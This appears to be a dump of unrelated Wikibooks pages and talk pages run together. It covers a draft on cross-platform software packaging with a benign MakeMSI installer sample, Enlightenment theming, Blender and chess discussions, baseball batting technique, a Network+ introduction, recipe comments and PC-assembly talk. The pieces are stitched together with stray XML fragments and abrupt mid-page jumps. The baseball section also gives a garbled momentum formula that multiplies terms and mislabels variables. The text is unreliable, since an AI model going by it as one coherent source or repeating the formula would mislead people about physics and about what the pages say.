*[[Template:Aves]]
*[[Template:Carnivora]]
*[[Template:Hexapoda]]
*[[Template:Mammalia glossary]]
*[[Template:Mollusca ]]
*[[Template:Reptilia]]
*[[Template:Ursidae]]

There may be more, but I can't find any others. --[[User:Whiteknight|Whiteknight]]&lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:07, 7 July 2006 (UTC)

: Each of these seems to have been older versions of the currently used ones. Since these were deprecated and unused, adding in no meaningful way to any module, this book or the wikibooks project as a whole, I've speedy deleted them on grounds of no meaningful content. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 16:13, 11 June 2008 (UTC)

==images==
I Think that illustrations could be a big improvement. If any question will be followed with image of the choice it could be much simplier to the novice user. [[User:192.115.235.2|192.115.235.2]] 12:32, 15 November 2007 (UTC)

== Organizing the book ==
Hi, I noticed your book is growing well, and you might want to split it up into several pages for a better online-experience. I therefore suggest you to split up your book into a couple of sections. The main page should just include a short introduction (your abstract would be fine, please also explain what TWW means) and a table of contents, like
 [[CPAM with TWW]]
 [[CPAM with TWW/Cross-Platform Application Management With CPAM HPMS]]
 [[CPAM with TWW/Porting TWW HPMS to other OS]]
 [[CPAM with TWW/GNUstep and TWW HPMS]]
 [[CPAM with TWW/Authors]]
and so on. Using subpages via &quot;/&quot; will give you an automatic link back to the main page of your book. Have a look at [[Hamster Care]] and [[How To Build A Computer]] how it is done there. For more information and possibilities look at the current discussion at [[Wikibooks:Hierarchy naming scheme]]. Use a flat hierarchy (that is, all pages should be a direct sub-page of &quot;CPAM with TWW&quot;) and avoid introducing red links or empty pages by too many subdivisions. 5 or 6 chapters should just be fine for your book as it is now. Also have a look at the discussions at [[User talk:Ojmorales0002#Organization of the Golden Bough]] and [[Talk:How To Build A Computer#Organizing the book]] for successful recent conversions. If you need any help or have questions, just ask. --[[User:Andreas Ipp|Andreas]] 10:53, 20 Mar 2005 (UTC)
== About Organizing the book ==

Thanks for the suggestions, points taken. It is growing but I am not sure when it can pass alpha stage of quality.

I am struggling between the wiki syntax of moimon and mediawike, and also the balance of family,work and my poor english.

Does this wikimedia support Graphviz ? I have lots of idea want to express them in graph. This book has another version which is in docbook format, in that format I used Graphviz to generate losts of jpg/png  to be included in docbook format of this book.

--tjyang 12:41, 20 Mar 2005 (UTC)

: Hi T J Yang. English should not be your main obstacle, since in the perfect Wikiworld, other people will come to brush up your English (if you wait long enough :-) ). About the pictures: YES, please put pictures into the book. If you are logged in you can upload pictures to Wikibooks so that you can use them here. You might also upload them to the [[commons:Main Page|Commons]], and use them immediately in all wikis, also Wikibooks. Keep the work, it is getting a very nice Wikibook! --[[User:Andreas Ipp|Andreas]] 19:47, 20 Mar 2005 (UTC)

Andrea, thanks for the encouragement.
What I really hope wikibooks can support is this extension.

== Overview ==

* Problems we are facing

Computers created by mankind are a reflection of human races. 
 
* Possible Solutions 
The Java environment is a good example aim to do same &quot;things&quot; across different incompatible paltforms. X Windows and GNUstep are  another two examples aim to provide unified and consistent programming environment for application developers. 

A solution to deal with application management across different OS is needed. 
Given GNUstep's cross-platform declaration on application development activities, so should the application management activities cross-platform unified. by unified, we don't mean to through away your existing investment on your application, we like to work with your existing system but to come up with a least denominator standard we can all agree upon. like ...TBA.

In this project we like to use GNUstep application as an example to demonstrate the benefits of using CPAM. There are currently different package sources to create GNUstep package for different OS paltforms. We will demonstrate using one package source to create native package for different OS. and also using same tool to maintain GNUstep package.

This book will explain using HPMS to package GNUstep for deploying GNUstep on different OS platform easily. Also we explore the possibility of integrating HPMS funcation into GNUstep to add HPMS into GNUstep.

==== Project Overview slides ====
 TBA.

===  Brief introduction  of a few PMS and its package format ===
** RPM
** Solaris pkgadd
** HP-UX SD-UX
** GNUstep pkg 
** MacOS X pkg
** Debian dpkg
** ipkg for Embeded Linux system.

* Comparison of HPMS

       --------  ----------   -----------  ----------
&lt;/pre&gt;

==== Why doing it ====
* Automation of  package management to improve efficiency.
* A software compiling process is very complex and needs to be exact on what other software you need to compile with and how you configure the compilation flags to the compiler. This complex process can actually be programmed into a script and be repeatable by easy commands without waiting for the  original author to reproduce the process. 

* Lots of time is spent by experienced gurus to assist new developer/packager with compiling the source.
* Time can be better spent on software developement instead of on  the compiling and packaging process.

* The software and package creation processes can be reproduced easily by others with simple commands.
* Improves QA testing by generating bug fixes quickly.

=== When ===
TBA.

=== Who ===

==== Technology Provider: TWW Inc. http://www.thewrittenword.com ====

This project is using CPAM tools created by TWW Inc.The company created TWW tool sets to help cross-platform open-source package creation and deployment. Currently GNUstep is not available in the list of their supported packages. The good thing is that we have a chance to invite steppers to create the package sources together. All sources of their supported packages are available at ftp://support.thewrittenword.com.  Those package sources need to be compiled with the vendor's compiler. The gcc compiler is used only on RedHat plaform.

==== Team member ====
* [[User:Tjyang|T.J. Yang]]

* Put your name and contact information here if you are serious about this project.

=== Plan ===

* Introduce the CPAM(Cross-Platform Application Management) tool implemented by TWW Inc. to the GNUstep CPAD community
** Cross-Platform is easier said than done because each platform's features are barriers for others.

* Release GNUstep package source implemented by TWW CPAM. 
** I will release a working package source for others to try and review. 
** The package sources can generate native package format for RHAS rpm,Solaris pkgadd and HP-UX depot formats. 

* Write a tutorial on learning TWW CPAM.
** I am willing to help/assist a few persons to get familiar with TWW tools if they promise to write up what they learned in a tutorial article.

=== Integrate GNUstep developement process with TWW CPAM ===
=== Current TWW HPMS supported Systems ===

please see http://www.thewrittenword.com/evaluate/ for currently supported OS platforms.

      <text xml:space="preserve">=== Porting TWW HPMS to other OS ===
There are two tasks need to be done when porting TWW HPMS tools to other OS.
* Porting the TWW HPMS tool itself
* Porting the package sources.
* The makefile to automate the TWW tools porting. 

==== Linksys NSLU2 ====
* A Makefile to build TWW tools for nslu2.
* compile sbtuils tool to generate sb
* use sb to compile and build pb and pkgutils

* Porting sbtools 
{{{

}}}
* Porting pbtools
* Porting pkgutils

==== Mac OS X ====
Doing our homework, following are some good documents about software packaging on Mac OS X.
* [http://s.sudre.free.fr/Stuff/PackageMaker_Howto.html PackageMaker Howto]
* Local PMS
The package management system is getting better but still fall short of a basic functionality that a PMS shoule have. Ex, you can't list out current installed package using command line tool. you can't remove a package using a command or handle package dependency automatically. 

/Developer/Applications/Utilities/PackageMaker.app/Contents/MacOS/PackageMaker is getting better in 10.3.8. we can now create a .pkg with command line. Be aware to supply absolute path after -p or -f options.

Following is an partial makefile to create TWW CPAM tools in Mac OSX's local PMS format.

* Porting sbtools 
sbutils-1.2.4 compiled ok on Mac OS X 10.3.8. We also can use packagemaker to generate sbutils-1.2.4 into Mac OS X's native package format.
Following quick notes need to be documented later.

==== Microsoft Windows ====
The first problem of porting TWW HPMS tool to Win32 platformat is which package creation software and  Unix foundation software to base upon. 


* Unix foundation software
** cygwin notes for sbutils package source.
   &quot;aux&quot; need to be renamed to &quot;auxx&quot;. 
   perl -pi -e 's!\/aux\/!/aux!' Makfile
   http://cygwin.com/setup.html is the place to understand cygwin package format.
** mingw
** SFU

* Package Creation tools
** MakeMSI (see http://users.cyberone.com.au/dbareis/makemsi.htm) automatically builds (or updates) MSI files (or any other type of Windows Installer databases). It uses an XML like scripting language which can be invoked via explorer or the command line. It also builds MSI documentation which includes file (MD5 checks installed files against expected etc.) and product verification buttons. It includes a very powerful preprocessor.
&lt;ol&gt;&lt;p&gt;Dialogs can be created and easily formatted without a dialog editor.
There are a number of &quot;frameworks&quot; for different uses and user skills. Custom action code can be integrated and has some ADSI/COMPLUS/scheduling and other support.
&lt;p&gt;The following is a small sample script (one file, one shortcut, one smallish VBSCRIPT based Custom Action). 
&lt;/ol&gt;
&lt;pre&gt;
;--- Load MAKEMSI (via wrapper which configures MAKEMSI to work how I like it) ---
#include &quot;DENNIS.MMH&quot;

;--- Create INSTALLDIR (we wish to install file(s) here) ---
&lt;$DirectoryTree Key=&quot;INSTALLDIR&quot; Dir=&quot;[ProgramFilesFolder]\TryMe&quot; CHANGE=&quot;\&quot; PrimaryFolder=&quot;Y&quot;&gt;

;--- Add &quot;TRY.MM&quot; and shortcut to same component (file must be keypath) ---
&lt;$Component &quot;TryMe&quot; Create=&quot;Y&quot; Directory_=&quot;INSTALLDIR&quot;&gt;   ;;In this case GUID autogenerated (at least 1st time)
    ;--- Add the files to the &quot;TryMe&quot; component -----------------------------
    &lt;$File SOURCE=&quot;TryMeWithAdvShortCut.MM&quot; KeyPath=&quot;Y&quot;&gt;

    ;--- Add the shortcut (advertise the &quot;complete&quot; feature) ----------------
    #(
        ;--- Advertised shortcut in &quot;Start-&gt;programs&quot; -----------------------
        &lt;$Shortcut
                   Dir=&quot;ProgramMenuFolder&quot;
               Feature=&quot;\&quot;                        ;;root feature is my &quot;complete&quot; one
                 Title=&quot;Open TryMeWithAdvShortCut.MM (via default association)&quot;
           Description=^Simply opens &quot;TryMeWithAdvShortCut.MM&quot; in associated handler (probably notepad)!^
                  Icon=&quot;@.\TryMe.ico&quot;
               WorkDir=&quot;INSTALLDIR&quot;
        &gt;
    #)
&lt;$/Component&gt;

;--- Display a message during a non-silent install (logs if silent) ---------
#data &quot;PopupCaData&quot;
   ;--- Some data we'd like to pass to the CA -------------------------------
   &quot;InstallationDirectory&quot; &quot;[INSTALLDIR]&quot;
   &quot;SystemFolder&quot; &quot;[SystemFolder]&quot;
#data
&lt;$VbsCa Binary=&quot;Popup.vbs&quot; DATA=^PopupCaData^&gt;
   &lt;$VbsCaEntry &quot;HiThere&quot;&gt;
       ;--- If the VBSCRIPT &quot;MsgBox&quot; or similar function was used this would prevent a silent install ---
       #(
            CaMsgBox &quot;I&quot;,
                     &quot;Hi this is a message from '&lt;?InputFile&gt;'! This was displayed via a VBSCRIPT MSI custom action.&quot; &amp;
                     vbCRLF &amp; vbCRLF &amp;
                     &quot;Note that I have enlarged this message box so that when an error occurs you will see the whole text! &quot; &amp;
                     &quot;This and most tweeking MAKEMSI does to the user interface is optional (most performed by &quot;&quot;UISAMPLE.MMH&quot;&quot;).&quot; &amp;
                     vbCRLF &amp; vbCRLF &amp;
                     &quot;The installation directory is &quot;&quot;&quot; &amp; VbsCaCadGet(&quot;InstallationDirectory&quot;) &amp; &quot;&quot;&quot;. &quot; &amp;
                     &quot;The system directory is &quot;&quot;&quot;       &amp; VbsCaCadGet(&quot;SystemFolder&quot;)          &amp; &quot;&quot;&quot;.&quot;
       #)
   &lt;$/VbsCaEntry&gt;
&lt;$/VbsCa&gt;
&lt;$VbsCaSetup Binary=&quot;Popup.vbs&quot; Entry=&quot;HiThere&quot; Seq=&quot;StartServices-&quot; CONDITION=^&lt;$CONDITION_INSTALL_ONLY&gt;^ DATA=^PopupCaData^&gt;

** Wix at http://sourceforge.net/projects/wix, it has XML,scriptting and command line support to generate a MSI package.
# The challenge of using Wix tool set to geneate a Unix package is the GUID. Fortunately mallow.exe come to the rescue. it can scan a src directory and generate GUID for each component(directory or file).
# We need to figure out how to make pb to generate wxs xml file and communicate with candle and light to gernate msi pacakge with the help of mallow.
 
# Following is an small batch file to illustrate creating a msi package, installing and remove this package.
candle and light are a pair of commandline package creation tool similar to rpmbuild in redhat,packagemaker in Max OS X or pkgmk in solaris.

=== Package Management Process ===

Software engineering process include design and implement software via software developers to generate source codes. The source codes will then need to be built,packaged and be managed. 
We can divide this process into three general steps. 

* Software build process(SB) and SB can be divided into following processes on a build machine
** source unpack
** source patch
** source configure
** source build to generate binary and documentation
** binary test
** binary install
** binary uninstall

* Package build (PB) process is much straight forward
** prepare the configuration script
** prepare init script to start/stop application service 
** call up local PMS to pack the binary,documentation and scripts into local PMS format.

* Package Management (PKGUTIL) Process
** upload and administrate packages on package depot server.
** install 
** remove
** upgrade/patch
** auto installation upon package dependence.

=== TWW HPMS introduction ===
TWW Inc. has three tools to match the package management processes.

* How to get TWW tools ?

=== TWW Inc. ===

All the TWW tools and sources of their supported packages are GPL compliant. 
They are freely available at their ftp site ftp://support.thewrittenword.com. 
But their support labor and binary packages are not free of charge.
We are glad TWW Inc. find a way to do open-source works and still can make a living out of it.     
Please support TWW Inc. if your workplace need such kind of service ( http://shopping.netsuite.com/tww ).

      <text xml:space="preserve">= GNUstep and TWW HPMS =

GNUstep aim to enable same source code to generate same software application with lease efforts. The approach is an intrusive approach with it own merits. we believe by incorporate CPAM ablitity within GNUstep. it can be most errogant and humble, intrusive and compatible. 

== GNUstep package by TWW HPMS tools ==
Following are quick examples for GNUsteppers. It is not a HellowWorld type of easy example. The package source still need to be refined. Goal of  gnustep-core-1.0.sb is to digitalize this document at http://www.gnustep.org/resources/documentation/User/GNUstep/gnustep-howto.html.

=== Software Build: gnustep-core-1.0.sb in a XML file ===
* This sb file can reproduce the build process with following command

 sb gnustep-core-1.10.sb;sb -i gnustep-core-1.10.sb

* Following command will list out the software modules in a GNUstep core

 [root] sb -q module-names gnustep-core-1.10.sb
 gnustep-base
 ffcall
 gnustep-examples
 gnustep-gui
 gworkspace
 gnustep-make
 gnustep-back

      <text xml:space="preserve">This is the tutorial to create and design themes for the Window Manager Enlightenment DR17.

'''What we need'''

--&gt; SORRY, IM JUST WORKING ON THE TUTORIAL &lt;--
--&gt; IF YOU WANT, WRITE SOME TEXT ABOUT THEMING E17 &lt;--

If you don't know how to install Enlightenment17 Themes, go to [http://get-e.org/ (Un)official Enlightenment Documentation]

Themes are not yet a part of Enlightenment17. If you want to install this nevertheless, you must place a new theme in the ~/.e/e/themes/ directory and name it &quot;default.eet&quot; or if you have a very recent build, name it &quot;default.edj&quot;, because the .eet extension has been depreciated. 
Then restart Enlightenment with &quot;enlightenment_remote -restart&quot;.

Further discussion like this belongs on the talk page.

== Consider Moving? ==

Popski,

I see you've already found this page:

http://en.wikibooks.org/wiki/Blender_3D

Would you consider moving your Memobook wikibook?  Right now it is here:

http://en.wikibooks.org/wiki/Blender_MemoBook

It seems to make more sense (to me, anyways) if it's here:

http://en.wikibooks.org/wiki/Blender_3D:_MemoBook

... and we can keep all the English Blender 3D books under http://en.wikibooks.org/wiki/Blender_3D 

Let me know.  Thanx.  --[[User:Spiderworm|Spiderworm]] 15:13, 31 Mar 2005 (UTC)

: Ok, done.

== .blend? ==

Popski,

Would you mind sharing the .blends for your pawns with the material settings you used?  I really like them and would like to create a materials tute with them.  --[[User:Spiderworm|Spiderworm]] 18:59, 5 Apr 2005 (UTC)

: No problem [[User:Spiderworm|Spiderworm]], but I am looking for a global solution of sharing .blend files. The best would be if we could upload and download .blend files on [http://commons.wikimedia.org Commons], but for this we will have to wait... You can read more about this topic [http://commons.wikimedia.org/wiki/Talk:Main_Page#File_Types here]. Second reasonable place for this is  [http://openclipart.org/cgi-bin/navigate Open Clip Art Library]. Answer about this option you can read [http://openclipart.org/cgi-bin/wiki.pl?OpenContentDiscussion here]. Maybe is on [http://www.blender3d.com Blender Community] to do this. I didn't ask them yet... In the meantime I will try to collect this files and put them somewhere on [http://ljudmila.org/ Ljudmila.org]. --[[User:Popski|Popski]] 10:58, 7 Apr 2005 (UTC)

:: I absolutely agree about putting them on the commons, and in fact several days ago put up this feature request http://bugzilla.wikimedia.org/show_bug.cgi?id=1790 ....   haven't seen any action on it and don't know if there will be.  Maybe we can find another, temporary host for these things...  I do have a website will some free space and could fit some blends on there, still thinking about it.  I hope the wikimedia folks will allow these other sorts of files because I could see it being very beneficial for Blender users.  --[[User:Spiderworm|Spiderworm]] 18:13, 7 Apr 2005 (UTC)

: We could wait for years for our public 3D model repository... :/ Ok, [[User:Spiderworm|Spiderworm]] you can download models temporary from my [http://stella.homelinux.net/ home server]. Have fun! --[[User:Popski|Popski]] 13:45, 23 Apr 2005 (UTC)

* Here is now possible to upload also .blend files: http://www.ourmedia.org --[[User:Popski|Popski]] 09:42, 27 May 2005 (UTC)

* [http://bugzilla.wikimedia.org/show_bug.cgi?id=898 Here] is talk about uploading all this files.--[[User:Popski|Popski]] 19:12, 1 September 2005 (UTC)

== [[NeoRandom Chess]] ==

This seems like primary research to me, which as a general rule we don't allow. See [[Wikibooks:About]] for details. - [[User:Aya|Aya]]&amp;nbsp;&lt;sup&gt;[[User talk:Aya|T]]&amp;nbsp;[[Special:Emailuser/Aya|E]]&amp;nbsp;[[Special:Contributions/Aya|C]]&lt;/sup&gt; 19:11, 17 August 2005 (UTC)

===Moving/Renaming of NeoRandom Chess===

I hope you notice that I didn't delete the NeoRandom Chess Wikibook, and I don't intend to either.  From the discussion on the [[Wikibooks:Votes for deletion]] regarding this Wikibook, the concensus (from what I was able to read as well as my own opinion) was to keep this Wikibook, but to rename it to merge it into the larger Chess Wikibook.  I know you consider this to be your own invention, and I have no problem with that either.  In terms of renaming the page, you are also welcome to change it back, or to rename it from a more generic &quot;Random Opening Chess&quot; back to &quot;NeoRandom Chess&quot;.  As a registered user you have this capability... it is not something that is exclusive to any admin or developer.  Just try to avoid getting into a page move fight, and make any changes of that nature something that is discussed on the &quot;discussion page&quot; of any Wikibook module you are working on first.

Seriously, I want to thank you for your contributions here on Wikibooks, and I hope that you contribute much more to this project.  There are many positive things that can happen here, and I hope you don't get the wrong impressions about anybody else trying to make Wikibooks a more productive place to be at.  It is very likely that the NeoRandom chess page will be here on Wikibooks for several years, perhaps long after you have moved on and do other things with your life besides contribute to Wikibooks.  By becoming a sub-page of the Chess Wikibook, that future will be ensured much better than if it were simply left as a stand-alone &quot;article&quot;.  I also think it is a neat variant of Chess, and when I get a good Chess partner I may try it out in a &quot;quick game&quot;.  --[[User:Robert Horning|Rob Horning]] 23:30, 2 September 2005 (UTC)

== Hi Popski ==

Hey man, remember me?  Just wanted to show you my new wikiblog. [[User:Spiderworm/blog]]  --[[User:Spiderworm|Spiderworm]] 16:56, 2 September 2005 (UTC)

Hello,&lt;br&gt;
As a recent contributor to Chess topics, I'd like inform you of the creation of a new project called [[Wikibooks:Chess]]&lt;br&gt; 
Recently this project page has been created and it is hoped that you will join.&lt;br&gt;
To overcome issues of communicating, the project has its own central page and talk area along with navigation system of useful pages and many new features to make communication among users much slicker and easier, including a [[Special:RecentChangesLinked/Chess/Index_of_chess_topics|public chess watchlist]]. No need to have your own watchlist anymore, one click and you can see all recent Chess edits!&lt;br&gt;
Also added recently is a new opening navigator (See below), a chess diagram upgrade (looks nice), and a chess stub category. All the [[Opening theory in chess]] pages now have this built in, that's over 500 pages upgraded.&lt;br&gt;

Hope to hear from you.
Regards

      <text xml:space="preserve">==Finding a bat==
The first thing you need to do is find a bat that suits you. The bat should be as tall as your hip when stood on the ground. The length may vary if you are a somewhat experienced batter and you know what length you like. Weight is a key issue when looking for a bat. As bat speed is key, a hitter should look for the lightest possible stick to swing, but keep this in mind: from a physics perspective, the formula &lt;math&gt;m1v1i x m2v2i = m1v2f x m2v2f&lt;/math&gt; where m1 is the mass of the ball, m2 is the bat, and v1,v2 are their respective speeds(i being initial, f being final). Wacky math aside, a heavier bat moving at the same speed as a less massive bat will empart more force on the ball, making the difference between a high fly, and a home run. An appropriate test for finding a bat of proper weight for your strength category is to hold the bat handle in one hand, parallel to the ground for 45 seconds. If you can hold it up, you should be strong enough to swing the stick.  This is just a general rule of thumb. if you find your speed is too slow, shave two ounces off the bats' mass.

==Gripping the bat== 
The grip the batter uses is important because it determines the bat speed. Your bottom hand should be placed half an inch from the knob of the bat. The “door-knocking” knuckles of you top hand should be roughly aligned with the &quot;door-knocking&quot; knuckles of your bottom hand. Reach back behind you and touch the head of the bat to your buttocks or your lower back. Now bring the bat around and hit the ground. Examine your knuckles and this is where you should try to have them. Remember to grip the bat loosely.

==The Stance, feet== 
Lets first start from the feet and work our way up. This process is long and perhaps the most important to get right. First, you need to place your front foot about 6-8 inches away from the top corner of the plate. Place you back foot parallel to your front foot and about shoulder-width apart. Now tilt your front foot at a little less than a 45-degree angle. It should be pointing at about the space between the second basemen and the first basemen (given you are a right handed batter). Now bend your knees and transfer your weight so that about 75% of it is resting on your back foot. Also, always remember to be on the balls of your feet, and not flatfooted.

==The Stance, body, arms, and head==
Now that you have the feet set, next on the list is the rest of your body. Your hip, shoulder and head should all be pointing to the pitcher. The hands should be held around the batters dominant breast. The back elbow should be at a 45-degree angle downward allowing for the bat to be at a 45-degree angle across your shoulder. The top of your top hand should be in the general area of the top of your back shoulder. Your chin should be in the area between either on your front shoulder or about an inch from it, and your head needs to be still at all times. Make sure you are comfortable because you must be relaxed in order to be a great hitter.

==The Stride and Load==
A batters stride should be short and only about three to four inches. All you're going to do is take a little step forward and point your toes toward the pitcher, keep in mind that most of your weight is on your back foot. Now onto the load. In the load technique you should shift your upper body weight slightly back in order to get that extra bit of power before you swing. Note that the Stride and Load are done at the same time. Also, against a live pitcher, the batters stride foot should go down as well as upper body weight shifting back at exactly the same time as the pitcher's front foot hits the ground. This is done in order to help your timing and reduce the risk of getting thrown off by a curve or change up.

==Head action and ball tracking==
The batter's head needs to be perfectly still and he must watch the ball from the pitcher's hand to the time it hits the bat. Your chin should transfer from your front shoulder to your back shoulder during the swing of the bat. You should make connection with the ball out in front of your body. Note that this all takes place during the swing.

==The Swing==
After the load and stride the next step for you is to swing the bat. The swing should be in a straight and slightly downward motion, always keeping your hands on the inside of your body. While this is happening the batter's back foot should pivot and the hips would turn forward so they too are now facing the pitcher. At the same time your hips are completely forward, the bat should be parallel to the ground and about waist height with both arms fully extended on a downward slant. This is where the point of contact should be.

==Extension and Finish==
After the point of contact, your arms should extend to shoulder height. At this point your wrists will involuntarily flip over and the bat should be pointing at the left fielder (given again that you are a right handed batter). Even during and after the extension, your head should still be looking at the invisible spot that was once the point of contact. The final step is to let the bat carry itself over your shoulder and run to first base.

__NOTOC__
This wikibook discusses the information necessary to obtain the [[wikipedia:CompTIA|CompTIA]] Network+ certification.  The Network+ certification is an internationally recognized validation of the technical knowledge required of foundation-level IT network practitioners.  The CompTIA Network+ and A+ exams can be applied together toward the Microsoft Certified Systems Administrator (MCSA) program, and other corporations such as Novell, Cisco and HP also recognize CompTIA Network+ as part of their certification tracks.

The Network+ certification ensures that the successful candidate has the important knowledge and skills necessary to manage, maintain, troubleshoot, install, operate and configure basic network infrastructure, describe networking technologies, basic design principles, and adhere to wiring standards and use testing tools.  Although not a prerequisite, it is recommended that CompTIA Network+ candidates have at least nine months of experience in network support or administration or adequate academic training, along with a CompTIA [[A+ Certification|A+ certification]].

It is written in the recipe that flour will be rolled in a ball but there is no actual mention of the amount of flour to use. And maybe an idea of the amount of samosa it will make would be a nice idea. [[User:24.201.116.26|24.201.116.26]] 04:18, 21 Mar 2005 (UTC)

One ball makes two samosas. The amount of flour required depends on the size of the samosa and the amount of filling.

--------------------------------------------------
This recipe is terrible. Olive oil????? use plain vegetable oil, mustard oil or ghee. add cumin and coriander seeds to the mix

== Page size ==

The article is currently at 35K. This might cause problems with older browser. I was wondering if we should even care about it and maybe split this up or scale this guide down.

is anyone against splitting it up? -CarbonUnit

How sould we split this up? - CarbonUnit

: Perhaps move the &quot;secondary components&quot; and &quot;peripherals&quot; sections onto a new page? (The distinction between them is getting more blurry, because manufacturers of &quot;secondary components&quot; that go inside the case are starting to distribute the same functionality in a &quot;peripheral&quot; that plugs into USB or ethernet.) --[[User:DavidCary|DavidCary]] 16:32, 28 December 2005 (UTC)

::I think it would make sense to split it.  IMO, the question is how exactly should it be split up?  I'm thinking each of the major questions could be a subpage, with the list of necessary components linking to each of those subpages.  But that's just my opinion.  Or, choosing the parts, then acquiring the parts, then a description of what to look for in each.  [[User:Bpogi|Bpogi]] 00:13, 22 February 2007 (UTC)

::I've begun copying individual sections to new subpages.  Already finished with CPU; see [[How_To_Assemble_A_Desktop_PC/Choosing_the_parts/CPU]]. &amp;mdash;[[User:Bpogi|Bpogi]] 03:20, 26 February 2007 (UTC)

::: Looks good so far.
::: Alas, it appears that the CPU section on this page is slowly diverging from the [[How_To_Assemble_A_Desktop_PC/Choosing_the_parts/CPU]] page.
::: In the name of [[Wiki:OnceAndOnlyOnce]], I moved all the text from the CPU section of this page to that page.
::: Hopefully that leads to one page with all the best up-to-date information, rather than 2 pages that each have some up-to-date information and some obsolete information.
::: Even though that edit reduced this page from 101,730 bytes to 84,877 bytes, it still seems a bit long to me. What else can we split into a separate page?

== On the other hand.... ==

'''''On the other hand''', somebody who is going to be playing the latest games on their new computer   is going to need a lot more graphics power. However, they may not want to spend much on computer   peripherals such as scanners, printers, or webcameras, because they have no interest in such devices. '''On the other hand''', someone may want a computer that offers both office and gaming experiences, and in that case they should expect to spend additional money on peripheral devices, along with   high-powered internal components.''

Sounds wrong.

:Then fix it! Every page has an edit button on it.[[User:Reub2000|Reub2000]]

== Meta: Editing ==

Section editing seems *horribly* broken here; is there a known reason?&lt;br&gt;--[[User:Baylink|Baylink]] 00:57, 2 August 2005 (UTC)



== Addressing low wage / adventurous teenager  groups ==

You are nicely describing how to build a machine by assembling parts, however, this is likely to be out of the scope for a larger readership of this book. What about the not so unlikely case that one finds a machine on the street waiting to be collected for transport to a landfill site, free for grab, or one is donated one, that one is interested to understand better. This might also be appropriate to readers in the third world. If this proposal gets some backup, then I might start something in that direction.

== Buying parts ==

I feel there should be a part on where to get parts. For example, buying parts online can be very cheap, but have problems of their own (such as rebate issues, shipping time, shipping cost, potentially limited warrenty, no way to test the part befroe you get it). Some online distributors which could be noted: www.pricewatch.com, www.newegg.com, www.tigerdirect.com, www.geeks.com.

So far, '''*all*''' the online computer dealers I've seen only ship within the USA. And I live in Mexico. So, I'd really like some suggestions about what to do if you're not from the States. [[User:201.128.248.147|201.128.248.147]] 02:00, 15 December 2005 (UTC)

== Dual Core ==

Seeing how dual-core CPU setup is getting quite common these days, I suggest elaborating on that a bit in the CPU section, such as advantages and disadvantages and so forth.

== 4800dpi resolution ==
&quot;For most purposes, a mid-range Inkjet Printer will be more than enough for most people, and ''you will generally want one that is capable of printing around 4800dpi''&quot;

Unless you want to print a bunch of photos, is 4800dpi really necessary? Most text and simple graphics are printed well below 1200dpi.

:Even if you're printing photos, you don't ''really'' need 4800dpi.  A 3x5&quot; photo at 4800x1200 dpi, about the standard of a mid- to high-end inkjet = 86,400,000 = 86.4 MP.  But it does look better with 4800dpi.  --[[User:Bpogi|Bpogi]] 03:57, 22 February 2007 (UTC)

:: I agree that 1200dpi is more than adequate for text and simple graphics.
:: However, a &quot;pixel&quot; on screen requires more than one &quot;dot&quot; on paper to adequately reproduce. A digital color photograph that looks great at 72 pixels per inch on screen looks horrible when printed on paper at 72 dots per inch or even 300 dots per inch. --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|discuss]] • [[Special:Contributions/DavidCary|contribs]]) 17:51, 10 February 2011 (UTC)

== dial up is &quot;more than adequate&quot; ==

Given the number of pages with graphics, ads or other features that any one using the web, even passively, is likely to use, I find the idea that dial up is &quot;more than adequate&quot; misleading. I feel it should be changed to just &quot;adequate&quot; to give the true level of quality offered by dial up.
&lt;br&gt;
&lt;br&gt;
#As someone who was until recently using dial-up, it's not adequate at all for the web. Wikipedia pages will take up to half an hour to load. Dial-up can really only handle IRC and email (oh, and telnet).

== Language Usage ==

It seems to me that there is some very relaxed usage of language throughout this wikibook. I've slowly begun going through each section and changing the language to a more proper and concise format. It would be nice to have some help though as I'm sure to miss something. Certain sections seem as though they are written by an avid gamer and don't really reflect the general computer market. Please be careful about language use when editing, and make sure to use proper full sentences that get your point across clearly.

== Audience ==

There have been other discussions and comments in above topics about the target audience and what information should be included, so I'm just starting this topic for that purpose.  Have at it.  --[[User:Bpogi|Bpogi]] 21:52, 22 February 2007 (UTC)

I would bet pesos to pizza (the geek version of dollars to donuts) that most people who read this article are near the novice end of the spectrum.  Tech professionals already know this stuff and would not go out of their way to look for a generic guide, although they might look for information specific to the hardware they are looking to install.  Even power users, or people who think they are power users, are apt to just dive in and start playing with the parts. With that in mind, you should assume that the reader knows little to nothing about standard terminology, safety and compatibility concerns, etc.  Peter B. Steiger, Cheyenne WY

== Old systems ==

Mabey you should state at the beginnig whether this book will tell you how to assemble a system out of old parts.

== Motherboard Bandwidths ==

Motherboard bandwidths do not seem to be mentioned in this WikiBook. Sometimes there can be subtle issues in motherboard bandwidth, and it is important to check for them. An important example is the 780i, in which there is not truly enough northbridge-southbridge bandwidth to feed system RAM to its two PCI-E 2.0 x16 slots, nor is the interconnect bandwidth truly sufficient. Note: This does NOT mean the 780i motherboard is weak on bandwidth compared to the competition.

== Windows vs Linux ==

Hello,

I feel this WikiBook is biased towards Windows, it says that Windows is a &quot;perfect&quot; solution for &quot;every&quot; need, whereas GNU/Linux based Systems are a &quot;good&quot; alternative, also mentioning &quot;preform many of the same functions as Windows and features similar programs&quot; . The text In my humble opinion, neither is perfect and will ever be and maybe we should also mention that Linux/UNIX can do lots of things Windows CANNOT do, even for Joe Customer ( supports more/especially older hardware), is safer, has less virii and other malware, allows better multiuser usage ( ~/bin , ~/etc, etc.. etc.. ) and can have higher performance in a lot of situations, especially with lots of programs loaded and regarding program launch time.

We should also consider the &quot;ranking&quot; as well as the fact that some VERY obsolete systems are mentioned( even though we could mention FreeDOS as arguably the &quot;best&quot;/ most modern DOS ), whereas some other, maybe more pro-user oriented but still easy-to-use systems are not mentioned at all ( I think Solaris here, has very good support, even the free one is great + great application integration + good security/performance/updates/etc + easy installer) [[Special:Contributions/84.161.35.36|84.161.35.36]] ([[User talk:84.161.35.36|talk]]) 16:46, 22 April 2009 (UTC)

== Prices of parts ==
The part prices given in the text are useless to anyone outside of North America. Someone's added a link to XE, but manufacturers sell components in Australia (this also may be true in other areas) at a much higher price than amount in US$ and shipping. Perhaps a more comprehensive list of shops would be better.

=== Accuracy of the information provided ===
T''hanks for taking time to clarify this. The matter I raised was of technical accuracy and not politics. My comments are inline ..''

I would like to comment about the information on Linux operating system. I had created that section but it was edited and some of the information was edited. The edited form is inaccurate and full of mis-information.
